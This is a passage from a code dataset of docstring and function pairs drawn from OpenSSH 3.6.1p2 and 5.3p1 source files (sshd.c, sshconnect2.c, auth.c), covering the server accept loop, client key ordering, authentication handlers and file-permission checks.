-1;\n\n\t\t/*\n\t\t * Stay listening for connections until the system crashes or\n\t\t * the daemon is killed with a signal.\n\t\t */\n\t\tfor (;;) {\n\t\t\tif (received_sighup)\n\t\t\t\tsighup_restart();\n\t\t\tif (fdset != NULL)\n\t\t\t\txfree(fdset);\n\t\t\tfdsetsz = howmany(maxfd+1, NFDBITS) * sizeof(fd_mask);\n\t\t\tfdset = (fd_set *)xmalloc(fdsetsz);\n\t\t\tmemset(fdset, 0, fdsetsz);\n\n\t\t\tfor (i = 0; i < num_listen_socks; i++)\n\t\t\t\tFD_SET(listen_socks[i], fdset);\n\t\t\tfor (i = 0; i < options.max_startups; i++)\n\t\t\t\tif (startup_pipes[i] != -1)\n\t\t\t\t\tFD_SET(startup_pipes[i], fdset);\n\n\t\t\t/* Wait in select until there is a connection. */\n\t\t\tret = select(maxfd+1, fdset, NULL, NULL, NULL);\n\t\t\tif (ret < 0 && errno != EINTR)\n\t\t\t\terror(\"select: %.100s\", strerror(errno));\n\t\t\tif (received_sigterm) {\n\t\t\t\tlog(\"Received signal %d; terminating.\",\n\t\t\t\t    (int) received_sigterm);\n\t\t\t\tclose_listen_socks();\n\t\t\t\tunlink(options.pid_file);\n\t\t\t\texit(255);\n\t\t\t}\n\t\t\tif (key_used && key_do_regen) {\n\t\t\t\tgenerate_ephemeral_server_key();\n\t\t\t\tkey_used = 0;\n\t\t\t\tkey_do_regen = 0;\n\t\t\t}\n\t\t\tif (ret < 0)\n\t\t\t\tcontinue;\n\n\t\t\tfor (i = 0; i < options.max_startups; i++)\n\t\t\t\tif (startup_pipes[i] != -1 &&\n\t\t\t\t    FD_ISSET(startup_pipes[i], fdset)) {\n\t\t\t\t\t/*\n\t\t\t\t\t * the read end of the pipe is ready\n\t\t\t\t\t * if the child has closed the pipe\n\t\t\t\t\t * after successful authentication\n\t\t\t\t\t * or if the child has died\n\t\t\t\t\t */\n\t\t\t\t\tclose(startup_pipes[i]);\n\t\t\t\t\tstartup_pipes[i] = -1;\n\t\t\t\t\tstartups--;\n\t\t\t\t}\n\t\t\tfor (i = 0; i < num_listen_socks; i++) {\n\t\t\t\tif (!FD_ISSET(listen_socks[i], fdset))\n\t\t\t\t\tcontinue;\n\t\t\t\tfromlen = sizeof(from);\n\t\t\t\tnewsock = accept(listen_socks[i], (struct sockaddr *)&from,\n\t\t\t\t    &fromlen);\n\t\t\t\tif (newsock < 0) {\n\t\t\t\t\tif (errno != EINTR && errno != EWOULDBLOCK)\n\t\t\t\t\t\terror(\"accept: %.100s\", strerror(errno));\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\tif (fcntl(newsock, F_SETFL, 0) < 0) {\n\t\t\t\t\terror(\"newsock del O_NONBLOCK: %s\", strerror(errno));\n\t\t\t\t\tclose(newsock);\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\tif (drop_connection(startups) == 1) {\n\t\t\t\t\tdebug(\"drop connection #%d\", startups);\n\t\t\t\t\tclose(newsock);\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\tif (pipe(startup_p) == -1) {\n\t\t\t\t\tclose(newsock);\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\n\t\t\t\tfor (j = 0; j < options.max_startups; j++)\n\t\t\t\t\tif (startup_pipes[j] == -1) {\n\t\t\t\t\t\tstartup_pipes[j] = startup_p[0];\n\t\t\t\t\t\tif (maxfd < startup_p[0])\n\t\t\t\t\t\t\tmaxfd = startup_p[0];\n\t\t\t\t\t\tstartups++;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\n\t\t\t\t/*\n\t\t\t\t * Got connection.  Fork a child to handle it, unless\n\t\t\t\t * we are in debugging mode.\n\t\t\t\t */\n\t\t\t\tif (debug_flag) {\n\t\t\t\t\t/*\n\t\t\t\t\t * In debugging mode.  Close the listening\n\t\t\t\t\t * socket, and start processing the\n\t\t\t\t\t * connection without forking.\n\t\t\t\t\t */\n\t\t\t\t\tdebug(\"Server will not fork when running in debugging mode.\");\n\t\t\t\t\tclose_listen_socks();\n\t\t\t\t\tsock_in = newsock;\n\t\t\t\t\tsock_out = newsock;\n\t\t\t\t\tstartup_pipe = -1;\n\t\t\t\t\tpid = getpid();\n\t\t\t\t\tbreak;\n\t\t\t\t} else {\n\t\t\t\t\t/*\n\t\t\t\t\t * Normal production daemon.  Fork, and have\n\t\t\t\t\t * the child process the connection. The\n\t\t\t\t\t * parent continues listening.\n\t\t\t\t\t */\n\t\t\t\t\tif ((pid = fork()) == 0) {\n\t\t\t\t\t\t/*\n\t\t\t\t\t\t * Child.  Close the listening and max_startup\n\t\t\t\t\t\t * sockets.  Start using the accepted socket.\n\t\t\t\t\t\t * Reinitialize logging (since our pid has\n\t\t\t\t\t\t * changed).  We break out of the loop to handle\n\t\t\t\t\t\t * the connection.\n\t\t\t\t\t\t */\n\t\t\t\t\t\tstartup_pipe = startup_p[1];\n\t\t\t\t\t\tclose_startup_pipes();\n\t\t\t\t\t\tclose_listen_socks();\n\t\t\t\t\t\tsock_in = newsock;\n\t\t\t\t\t\tsock_out = newsock;\n\t\t\t\t\t\tlog_init(__progname, options.log_level, options.log_facility, log_stderr);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t/* Parent.  Stay in the loop. */\n\t\t\t\tif (pid < 0)\n\t\t\t\t\terror(\"fork: %.100s\", strerror(errno));\n\t\t\t\telse\n\t\t\t\t\tdebug(\"Forked child %ld.\", (long)pid);\n\n\t\t\t\tclose(startup_p[1]);\n\n\t\t\t\t/* Mark that the key has been used (it was \"given\" to the child). */\n\t\t\t\tif ((options.protocol & SSH_PROTO_1) &&\n\t\t\t\t    key_used == 0) {\n\t\t\t\t\t/* Schedule server key regeneration alarm. */\n\t\t\t\t\tsignal(SIGALRM, key_regeneration_alarm);\n\t\t\t\t\talarm(options.key_regeneration_time);\n\t\t\t\t\tkey_used = 1;\n\t\t\t\t}\n\n\t\t\t\tarc4random_stir();\n\n\t\t\t\t/* Close the new socket (the child is now taking care of it). */\n\t\t\t\tclose(newsock);\n\t\t\t}\n\t\t\t/* child process check (or debug mode) */\n\t\t\tif (num_listen_socks < 0)\n\t\t\t\tbreak;\n\t\t}\n\t}\n\n\t/* This is the child processing a new connection. */\n\n\t/*\n\t * Create a new session and process group since the 4.4BSD\n\t * setlogin() affects the entire process group.  We don't\n\t * want the child to be able to affect the parent.\n\t */\n#if !defined(STREAMS_PUSH_ACQUIRES_CTTY)\n\t/*\n\t * If setsid is called on Solaris, sshd will acquire the controlling\n\t * terminal while pushing STREAMS modules. This will prevent the\n\t * shell from acquiring it later.\n\t */\n\tif (!debug_flag && !inetd_flag && setsid() < 0)\n\t\terror(\"setsid: %.100s\", strerror(errno));\n#endif\n\n\t/*\n\t * Disable the key regeneration alarm.  We will not regenerate the\n\t * key since we are no longer in a position to give it to anyone. We\n\t * will not restart on SIGHUP since it no longer makes sense.\n\t */\n\talarm(0);\n\tsignal(SIGALRM, SIG_DFL);\n\tsignal(SIGHUP, SIG_DFL);\n\tsignal(SIGTERM, SIG_DFL);\n\tsignal(SIGQUIT, SIG_DFL);\n\tsignal(SIGCHLD, SIG_DFL);\n\tsignal(SIGINT, SIG_DFL);\n\n\t/* Set keepalives if requested. */\n\tif (options.keepalives &&\n\t    setsockopt(sock_in, SOL_SOCKET, SO_KEEPALIVE, &on,\n\t    sizeof(on)) < 0)\n\t\terror(\"setsockopt SO_KEEPALIVE: %.100s\", strerror(errno));\n\n\t/*\n\t * Register our connection.  This turns encryption off because we do\n\t * not have a key.\n\t */\n\tpacket_set_connection(sock_in, sock_out);\n\n\tremote_port = get_remote_port();\n\tremote_ip = get_remote_ipaddr();\n\n#ifdef LIBWRAP\n\t/* Check whether logins are denied from this host. */\n\t{\n\t\tstruct request_info req;\n\n\t\trequest_init(&req, RQ_DAEMON, __progname, RQ_FILE, sock_in, 0);\n\t\tfromhost(&req);\n\n\t\tif (!hosts_access(&req)) {\n\t\t\tdebug(\"Connection refused by tcp wrapper\");\n\t\t\trefuse(&req);\n\t\t\t/* NOTREACHED */\n\t\t\tfatal(\"libwrap refuse returns\");\n\t\t}\n\t}\n#endif /* LIBWRAP */\n\n\t/* Log the connection. */\n\tverbose(\"Connection from %.500s port %d\", remote_ip, remote_port);\n\n\t/*\n\t * We don\\'t want to listen forever unless the other side\n\t * successfully authenticates itself.  So we set up an alarm which is\n\t * cleared after successful authentication.  A limit of zero\n\t * indicates no limit. Note that we don\\'t set the alarm in debugging\n\t * mode; it is just annoying to have the server exit just when you\n\t * are about to discover the bug.\n\t */\n\tsignal(SIGALRM, grace_alarm_handler);\n\tif (!debug_flag)\n\t\talarm(options.login_grace_time);\n\n\tsshd_exchange_identification(sock_in, sock_out);\n\t/*\n\t * Check that the connection comes from a privileged port.\n\t * Rhosts-Authentication only makes sense from privileged\n\t * programs.  Of course, if the intruder has root access on his local\n\t * machine, he can connect from any port.  So do not use these\n\t * authentication methods from machines that you do not trust.\n\t */\n\tif (options.rhosts_authentication &&\n\t    (remote_port >= IPPORT_RESERVED ||\n\t    remote_port < IPPORT_RESERVED / 2)) {\n\t\tdebug(\"Rhosts Authentication disabled, \"\n\t\t    \"originating port %d not trusted.\", remote_port);\n\t\toptions.rhosts_authentication = 0;\n\t}\n#if defined(KRB4) && !defined(KRB5)\n\tif (!packet_connection_is_ipv4() &&\n\t    options.kerberos_authentication) {\n\t\tdebug(\"Kerberos Authentication disabled, only available for IPv4.\");\n\t\toptions.kerberos_authentication = 0;\n\t}\n#endif /* KRB4 && !KRB5 */\n#ifdef AFS\n\t/* If machine has AFS, set process authentication group. */\n\tif (k_hasafs()) {\n\t\tk_setpag();\n\t\tk_unlog();\n\t}\n#endif /* AFS */\n\n\tpacket_set_nonblocking();\n\n\tif (use_privsep)\n\t\tif ((authctxt = privsep_preauth()) != NULL)\n\t\t\tgoto authenticated;\n\n\t/* perform the key exchange */\n\t/* authenticate user and start session */\n\tif (compat20) {\n\t\tdo_ssh2_kex();\n\t\tauthctxt = do_authentication2();\n\t} else {\n\t\tdo_ssh1_kex();\n\t\tauthctxt = do_authentication();\n\t}\n\t/*\n\t * If we use privilege separation, the unprivileged child transfers\n\t * the current keystate and exits\n\t */\n\tif (use_privsep) {\n\t\tmm_send_keystate(pmonitor);\n\t\texit(0);\n\t}\n\n authenticated:\n\t/*\n\t * In privilege separation, we fork another child and prepare\n\t * file descriptor passing.\n\t */\n\tif (use_privsep) {\n\t\tprivsep_postauth(authctxt);\n\t\t/* the monitor process [priv] will not return */\n\t\tif (!compat20)\n\t\t\tdestroy_sensitive_data();\n\t}\n\n\t/* Perform session preparation. */\n\tdo_authenticated(authctxt);\n\n\t/* The connection has been terminated. */\n\tverbose(\"Closing connection to %.100s\", remote_ip);\n\n#ifdef USE_PAM\n\tfinish_pam();\n#endif /* USE_PAM */\n\n\tpacket_close();\n\n\tif (use_privsep)\n\t\tmm_terminate();\n\n\texit(0);\n}", "path": "src\\openssh\\openssh-3.6.1p2\\sshd.c", "repo_name": "eposts/Rich", "stars": 59, "license": "None", "language": "c", "size": 424575}
{"docstring": "/*\n * try keys in the following order:\n *\t1. agent keys that are found in the config file\n *\t2. other agent keys\n *\t3. keys that are only listed in the config file\n */\n", "func_signal": "static void\npubkey_prepare(Authctxt *authctxt)", "code": "{\n\tIdentity *id;\n\tIdlist agent, files, *preferred;\n\tKey *key;\n\tAuthenticationConnection *ac;\n\tchar *comment;\n\tint i, found;\n\n\tTAILQ_INIT(&agent);\t/* keys from the agent */\n\tTAILQ_INIT(&files);\t/* keys from the config file */\n\tpreferred = &authctxt->keys;\n\tTAILQ_INIT(preferred);\t/* preferred order of keys */\n\n\t/* list of keys stored in the filesystem */\n\tfor (i = 0; i < options.num_identity_files; i++) {\n\t\tkey = options.identity_keys[i];\n\t\tif (key && key->type == KEY_RSA1)\n\t\t\tcontinue;\n\t\toptions.identity_keys[i] = NULL;\n\t\tid = xcalloc(1, sizeof(*id));\n\t\tid->key = key;\n\t\tid->filename = xstrdup(options.identity_files[i]);\n\t\tTAILQ_INSERT_TAIL(&files, id, next);\n\t}\n\t/* list of keys supported by the agent */\n\tif ((ac = ssh_get_authentication_connection())) {\n\t\tfor (key = ssh_get_first_identity(ac, &comment, 2);\n\t\t    key != NULL;\n\t\t    key = ssh_get_next_identity(ac, &comment, 2)) {\n\t\t\tfound = 0;\n\t\t\tTAILQ_FOREACH(id, &files, next) {\n\t\t\t\t/* agent keys from the config file are preferred */\n\t\t\t\tif (key_equal(key, id->key)) {\n\t\t\t\t\tkey_free(key);\n\t\t\t\t\txfree(comment);\n\t\t\t\t\tTAILQ_REMOVE(&files, id, next);\n\t\t\t\t\tTAILQ_INSERT_TAIL(preferred, id, next);\n\t\t\t\t\tid->ac = ac;\n\t\t\t\t\tfound = 1;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (!found && !options.identities_only) {\n\t\t\t\tid = xcalloc(1, sizeof(*id));\n\t\t\t\tid->key = key;\n\t\t\t\tid->filename = comment;\n\t\t\t\tid->ac = ac;\n\t\t\t\tTAILQ_INSERT_TAIL(&agent, id, next);\n\t\t\t}\n\t\t}\n\t\t/* append remaining agent keys */\n\t\tfor (id = TAILQ_FIRST(&agent); id; id = TAILQ_FIRST(&agent)) {\n\t\t\tTAILQ_REMOVE(&agent, id, next);\n\t\t\tTAILQ_INSERT_TAIL(preferred, id, next);\n\t\t}\n\t\tauthctxt->agent = ac;\n\t}\n\t/* append remaining keys from the config file */\n\tfor (id = TAILQ_FIRST(&files); id; id = TAILQ_FIRST(&files)) {\n\t\tTAILQ_REMOVE(&files, id, next);\n\t\tTAILQ_INSERT_TAIL(preferred, id, next);\n\t}\n\tTAILQ_FOREACH(id, preferred, next) {\n\t\tdebug2(\"key: %s (%p)\", id->filename, id->key);\n\t}\n}", "path": "src\\openssh\\openssh-5.3p1\\.pc\\old-gssapi.patch\\sshconnect2.c", "repo_name": "eposts/Rich", "stars": 59, "license": "None", "language": "c", "size": 424575}
{"docstring": "/*\n * Signal handler for SIGHUP.  Sshd execs itself when it receives SIGHUP;\n * the effect is to reread the configuration file (and to regenerate\n * the server key).\n */\n", "func_signal": "static void\nsighup_handler(int sig)", "code": "{\n\tint save_errno = errno;\n\n\treceived_sighup = 1;\n\tsignal(SIGHUP, sighup_handler);\n\terrno = save_errno;\n}", "path": "src\\openssh\\openssh-3.6.1p2\\sshd.c", "repo_name": "eposts/Rich", "stars": 59, "license": "None", "language": "c", "size": 424575}
{"docstring": "/* JPAKE */\n", "func_signal": "static int\nidentity_sign(Identity *id, u_char **sigp, u_int *lenp,\n    u_char *data, u_int datalen)", "code": "{\n\tKey *prv;\n\tint ret;\n\n\t/* the agent supports this key */\n\tif (id->ac)\n\t\treturn (ssh_agent_sign(id->ac, id->key, sigp, lenp,\n\t\t    data, datalen));\n\t/*\n\t * we have already loaded the private key or\n\t * the private key is stored in external hardware\n\t */\n\tif (id->isprivate || (id->key->flags & KEY_FLAG_EXT))\n\t\treturn (key_sign(id->key, sigp, lenp, data, datalen));\n\t/* load the private key from the file */\n\tif ((prv = load_identity_file(id->filename)) == NULL)\n\t\treturn (-1);\n\tret = key_sign(prv, sigp, lenp, data, datalen);\n\tkey_free(prv);\n\treturn (ret);\n}", "path": "src\\openssh\\openssh-5.3p1\\.pc\\old-gssapi.patch\\sshconnect2.c", "repo_name": "eposts/Rich", "stars": 59, "license": "None", "language": "c", "size": 424575}
{"docstring": "/*\n * Given a template and a passwd structure, build a filename\n * by substituting % tokenised options. Currently, %% becomes '%',\n * %h becomes the home directory and %u the username.\n *\n * This returns a buffer allocated by xmalloc.\n */\n", "func_signal": "static char *\nexpand_authorized_keys(const char *filename, struct passwd *pw)", "code": "{\n\tchar *file, ret[MAXPATHLEN];\n\tint i;\n\n\tfile = percent_expand(filename, \"h\", pw->pw_dir,\n\t    \"u\", pw->pw_name, (char *)NULL);\n\n\t/*\n\t * Ensure that filename starts anchored. If not, be backward\n\t * compatible and prepend the '%h/'\n\t */\n\tif (*file == '/')\n\t\treturn (file);\n\n\ti = snprintf(ret, sizeof(ret), \"%s/%s\", pw->pw_dir, file);\n\tif (i < 0 || (size_t)i >= sizeof(ret))\n\t\tfatal(\"expand_authorized_keys: path too long\");\n\txfree(file);\n\treturn (xstrdup(ret));\n}", "path": "src\\openssh\\openssh-5.3p1\\auth.c", "repo_name": "eposts/Rich", "stars": 59, "license": "None", "language": "c", "size": 424575}
{"docstring": "/* ARGSUSED */\n", "func_signal": "void\ninput_gssapi_error(int type, u_int32_t plen, void *ctxt)", "code": "{\n\tOM_uint32 maj, min;\n\tchar *msg;\n\tchar *lang;\n\n\tmaj=packet_get_int();\n\tmin=packet_get_int();\n\tmsg=packet_get_string(NULL);\n\tlang=packet_get_string(NULL);\n\n\tpacket_check_eom();\n\n\tdebug(\"Server GSSAPI Error:\\n%s\", msg);\n\txfree(msg);\n\txfree(lang);\n}", "path": "src\\openssh\\openssh-5.3p1\\.pc\\old-gssapi.patch\\sshconnect2.c", "repo_name": "eposts/Rich", "stars": 59, "license": "None", "language": "c", "size": 424575}
{"docstring": "/* ARGSUSED */\n", "func_signal": "void\ninput_userauth_error(int type, u_int32_t seq, void *ctxt)", "code": "{\n\tfatal(\"input_userauth_error: bad message during authentication: \"\n\t    \"type %d\", type);\n}", "path": "src\\openssh\\openssh-5.3p1\\.pc\\old-gssapi.patch\\sshconnect2.c", "repo_name": "eposts/Rich", "stars": 59, "license": "None", "language": "c", "size": 424575}
{"docstring": "/*\n * Decrypt session_key_int using our private server key and private host key\n * (key with larger modulus first).\n */\n", "func_signal": "int\nssh1_session_key(BIGNUM *session_key_int)", "code": "{\n\tint rsafail = 0;\n\n\tif (BN_cmp(sensitive_data.server_key->rsa->n, sensitive_data.ssh1_host_key->rsa->n) > 0) {\n\t\t/* Server key has bigger modulus. */\n\t\tif (BN_num_bits(sensitive_data.server_key->rsa->n) <\n\t\t    BN_num_bits(sensitive_data.ssh1_host_key->rsa->n) + SSH_KEY_BITS_RESERVED) {\n\t\t\tfatal(\"do_connection: %s: server_key %d < host_key %d + SSH_KEY_BITS_RESERVED %d\",\n\t\t\t    get_remote_ipaddr(),\n\t\t\t    BN_num_bits(sensitive_data.server_key->rsa->n),\n\t\t\t    BN_num_bits(sensitive_data.ssh1_host_key->rsa->n),\n\t\t\t    SSH_KEY_BITS_RESERVED);\n\t\t}\n\t\tif (rsa_private_decrypt(session_key_int, session_key_int,\n\t\t    sensitive_data.server_key->rsa) <= 0)\n\t\t\trsafail++;\n\t\tif (rsa_private_decrypt(session_key_int, session_key_int,\n\t\t    sensitive_data.ssh1_host_key->rsa) <= 0)\n\t\t\trsafail++;\n\t} else {\n\t\t/* Host key has bigger modulus (or they are equal). */\n\t\tif (BN_num_bits(sensitive_data.ssh1_host_key->rsa->n) <\n\t\t    BN_num_bits(sensitive_data.server_key->rsa->n) + SSH_KEY_BITS_RESERVED) {\n\t\t\tfatal(\"do_connection: %s: host_key %d < server_key %d + SSH_KEY_BITS_RESERVED %d\",\n\t\t\t    get_remote_ipaddr(),\n\t\t\t    BN_num_bits(sensitive_data.ssh1_host_key->rsa->n),\n\t\t\t    BN_num_bits(sensitive_data.server_key->rsa->n),\n\t\t\t    SSH_KEY_BITS_RESERVED);\n\t\t}\n\t\tif (rsa_private_decrypt(session_key_int, session_key_int,\n\t\t    sensitive_data.ssh1_host_key->rsa) < 0)\n\t\t\trsafail++;\n\t\tif (rsa_private_decrypt(session_key_int, session_key_int,\n\t\t    sensitive_data.server_key->rsa) < 0)\n\t\t\trsafail++;\n\t}\n\treturn (rsafail);\n}", "path": "src\\openssh\\openssh-3.6.1p2\\sshd.c", "repo_name": "eposts/Rich", "stars": 59, "license": "None", "language": "c", "size": 424575}
{"docstring": "/*\n * Send userauth request message specifying keyboard-interactive method.\n */\n", "func_signal": "int\nuserauth_kbdint(Authctxt *authctxt)", "code": "{\n\tstatic int attempt = 0;\n\n\tif (attempt++ >= options.number_of_password_prompts)\n\t\treturn 0;\n\t/* disable if no SSH2_MSG_USERAUTH_INFO_REQUEST has been seen */\n\tif (attempt > 1 && !authctxt->info_req_seen) {\n\t\tdebug3(\"userauth_kbdint: disable: no info_req_seen\");\n\t\tdispatch_set(SSH2_MSG_USERAUTH_INFO_REQUEST, NULL);\n\t\treturn 0;\n\t}\n\n\tdebug2(\"userauth_kbdint\");\n\tpacket_start(SSH2_MSG_USERAUTH_REQUEST);\n\tpacket_put_cstring(authctxt->server_user);\n\tpacket_put_cstring(authctxt->service);\n\tpacket_put_cstring(authctxt->method->name);\n\tpacket_put_cstring(\"\");\t\t\t\t\t/* lang */\n\tpacket_put_cstring(options.kbd_interactive_devices ?\n\t    options.kbd_interactive_devices : \"\");\n\tpacket_send();\n\n\tdispatch_set(SSH2_MSG_USERAUTH_INFO_REQUEST, &input_userauth_info_req);\n\treturn 1;\n}", "path": "src\\openssh\\openssh-5.3p1\\.pc\\old-gssapi.patch\\sshconnect2.c", "repo_name": "eposts/Rich", "stars": 59, "license": "None", "language": "c", "size": 424575}
{"docstring": "/* ARGSUSED */\n", "func_signal": "void\ninput_gssapi_response(int type, u_int32_t plen, void *ctxt)", "code": "{\n\tAuthctxt *authctxt = ctxt;\n\tGssctxt *gssctxt;\n\tu_int oidlen;\n\tu_char *oidv;\n\n\tif (authctxt == NULL)\n\t\tfatal(\"input_gssapi_response: no authentication context\");\n\tgssctxt = authctxt->methoddata;\n\n\t/* Setup our OID */\n\toidv = packet_get_string(&oidlen);\n\n\tif (oidlen <= 2 ||\n\t    oidv[0] != SSH_GSS_OIDTYPE ||\n\t    oidv[1] != oidlen - 2) {\n\t\txfree(oidv);\n\t\tdebug(\"Badly encoded mechanism OID received\");\n\t\tuserauth(authctxt, NULL);\n\t\treturn;\n\t}\n\n\tif (!ssh_gssapi_check_oid(gssctxt, oidv + 2, oidlen - 2))\n\t\tfatal(\"Server returned different OID than expected\");\n\n\tpacket_check_eom();\n\n\txfree(oidv);\n\n\tif (GSS_ERROR(process_gssapi_token(ctxt, GSS_C_NO_BUFFER))) {\n\t\t/* Start again with next method on list */\n\t\tdebug(\"Trying to start again\");\n\t\tuserauth(authctxt, NULL);\n\t\treturn;\n\t}\n}", "path": "src\\openssh\\openssh-5.3p1\\.pc\\old-gssapi.patch\\sshconnect2.c", "repo_name": "eposts/Rich", "stars": 59, "license": "None", "language": "c", "size": 424575}
{"docstring": "/* ARGSUSED */\n", "func_signal": "void\ninput_userauth_jpake_server_step2(int type, u_int32_t seq, void *ctxt)", "code": "{\n\tAuthctxt *authctxt = ctxt;\n\tstruct jpake_ctx *pctx = authctxt->methoddata;\n\tu_char *x4_s_proof;\n\tu_int x4_s_proof_len;\n\n\t/* Disable this message */\n\tdispatch_set(SSH2_MSG_USERAUTH_JPAKE_SERVER_STEP2, NULL);\n\n\tif ((pctx->b = BN_new()) == NULL)\n\t\tfatal(\"%s: BN_new\", __func__);\n\n\t/* Fetch step 2 values */\n\tpacket_get_bignum2(pctx->b);\n\tx4_s_proof = packet_get_string(&x4_s_proof_len);\n\tpacket_check_eom();\n\n\tJPAKE_DEBUG_CTX((pctx, \"step 2 received in %s\", __func__));\n\n\t/* Derive shared key and calculate confirmation hash */\n\tjpake_key_confirm(pctx->grp, pctx->s, pctx->b,\n\t    pctx->x2, pctx->g_x1, pctx->g_x2, pctx->g_x3, pctx->g_x4,\n\t    pctx->client_id, pctx->client_id_len,\n\t    pctx->server_id, pctx->server_id_len,\n\t    session_id2, session_id2_len,\n\t    x4_s_proof, x4_s_proof_len,\n\t    &pctx->k,\n\t    &pctx->h_k_cid_sessid, &pctx->h_k_cid_sessid_len);\n\n\tbzero(x4_s_proof, x4_s_proof_len);\n\txfree(x4_s_proof);\n\n\tJPAKE_DEBUG_CTX((pctx, \"confirm sending in %s\", __func__));\n\n\t/* Send key confirmation proof */\n\tpacket_start(SSH2_MSG_USERAUTH_JPAKE_CLIENT_CONFIRM);\n\tpacket_put_string(pctx->h_k_cid_sessid, pctx->h_k_cid_sessid_len);\n\tpacket_send();\n\n\t/* Expect confirmation from peer */\n\tdispatch_set(SSH2_MSG_USERAUTH_JPAKE_SERVER_CONFIRM,\n\t    input_userauth_jpake_server_confirm);\n}", "path": "src\\openssh\\openssh-5.3p1\\.pc\\old-gssapi.patch\\sshconnect2.c", "repo_name": "eposts/Rich", "stars": 59, "license": "None", "language": "c", "size": 424575}
{"docstring": "/*\n * Check a given file for security. This is defined as all components\n * of the path to the file must be owned by either the owner of\n * of the file or root and no directories must be group or world writable.\n *\n * XXX Should any specific check be done for sym links ?\n *\n * Takes an open file descriptor, the file name, a uid and and\n * error buffer plus max size as arguments.\n *\n * Returns 0 on success and -1 on failure\n */\n", "func_signal": "static int\nsecure_filename(FILE *f, const char *file, struct passwd *pw,\n    char *err, size_t errlen)", "code": "{\n\tuid_t uid = pw->pw_uid;\n\tchar buf[MAXPATHLEN], homedir[MAXPATHLEN];\n\tchar *cp;\n\tint comparehome = 0;\n\tstruct stat st;\n\n\tif (realpath(file, buf) == NULL) {\n\t\tsnprintf(err, errlen, \"realpath %s failed: %s\", file,\n\t\t    strerror(errno));\n\t\treturn -1;\n\t}\n\tif (realpath(pw->pw_dir, homedir) != NULL)\n\t\tcomparehome = 1;\n\n\t/* check the open file to avoid races */\n\tif (fstat(fileno(f), &st) < 0 ||\n\t    (st.st_uid != 0 && st.st_uid != uid) ||\n\t    (st.st_mode & 022) != 0) {\n\t\tsnprintf(err, errlen, \"bad ownership or modes for file %s\",\n\t\t    buf);\n\t\treturn -1;\n\t}\n\n\t/* for each component of the canonical path, walking upwards */\n\tfor (;;) {\n\t\tif ((cp = dirname(buf)) == NULL) {\n\t\t\tsnprintf(err, errlen, \"dirname() failed\");\n\t\t\treturn -1;\n\t\t}\n\t\tstrlcpy(buf, cp, sizeof(buf));\n\n\t\tdebug3(\"secure_filename: checking '%s'\", buf);\n\t\tif (stat(buf, &st) < 0 ||\n\t\t    (st.st_uid != 0 && st.st_uid != uid) ||\n\t\t    (st.st_mode & 022) != 0) {\n\t\t\tsnprintf(err, errlen,\n\t\t\t    \"bad ownership or modes for directory %s\", buf);\n\t\t\treturn -1;\n\t\t}\n\n\t\t/* If are passed the homedir then we can stop */\n\t\tif (comparehome && strcmp(homedir, buf) == 0) {\n\t\t\tdebug3(\"secure_filename: terminating check at '%s'\",\n\t\t\t    buf);\n\t\t\tbreak;\n\t\t}\n\t\t/*\n\t\t * dirname should always complete with a \"/\" path,\n\t\t * but we can be paranoid and check for \".\" too\n\t\t */\n\t\tif ((strcmp(\"/\", buf) == 0) || (strcmp(\".\", buf) == 0))\n\t\t\tbreak;\n\t}\n\treturn 0;\n}", "path": "src\\openssh\\openssh-5.3p1\\auth.c", "repo_name": "eposts/Rich", "stars": 59, "license": "None", "language": "c", "size": 424575}
{"docstring": "/* Demote private to public keys for network child */\n", "func_signal": "void\ndemote_sensitive_data(void)", "code": "{\n\tKey *tmp;\n\tint i;\n\n\tif (sensitive_data.server_key) {\n\t\ttmp = key_demote(sensitive_data.server_key);\n\t\tkey_free(sensitive_data.server_key);\n\t\tsensitive_data.server_key = tmp;\n\t}\n\n\tfor (i = 0; i < options.num_host_key_files; i++) {\n\t\tif (sensitive_data.host_keys[i]) {\n\t\t\ttmp = key_demote(sensitive_data.host_keys[i]);\n\t\t\tkey_free(sensitive_data.host_keys[i]);\n\t\t\tsensitive_data.host_keys[i] = tmp;\n\t\t\tif (tmp->type == KEY_RSA1)\n\t\t\t\tsensitive_data.ssh1_host_key = tmp;\n\t\t}\n\t}\n\n\t/* We do not clear ssh1_host key and cookie.  XXX - Okay Niels? */\n}", "path": "src\\openssh\\openssh-3.6.1p2\\sshd.c", "repo_name": "eposts/Rich", "stars": 59, "license": "None", "language": "c", "size": 424575}
{"docstring": "/*\n * returns 1 if connection should be dropped, 0 otherwise.\n * dropping starts at connection #max_startups_begin with a probability\n * of (max_startups_rate/100). the probability increases linearly until\n * all connections are dropped for startups > max_startups\n */\n", "func_signal": "static int\ndrop_connection(int startups)", "code": "{\n\tdouble p, r;\n\n\tif (startups < options.max_startups_begin)\n\t\treturn 0;\n\tif (startups >= options.max_startups)\n\t\treturn 1;\n\tif (options.max_startups_rate == 100)\n\t\treturn 1;\n\n\tp  = 100 - options.max_startups_rate;\n\tp *= startups - options.max_startups_begin;\n\tp /= (double) (options.max_startups - options.max_startups_begin);\n\tp += options.max_startups_rate;\n\tp /= 100.0;\n\tr = arc4random() / (double) UINT_MAX;\n\n\tdebug(\"drop_connection: p %g, r %g\", p, r);\n\treturn (r < p) ? 1 : 0;\n}", "path": "src\\openssh\\openssh-3.6.1p2\\sshd.c", "repo_name": "eposts/Rich", "stars": 59, "license": "None", "language": "c", "size": 424575}
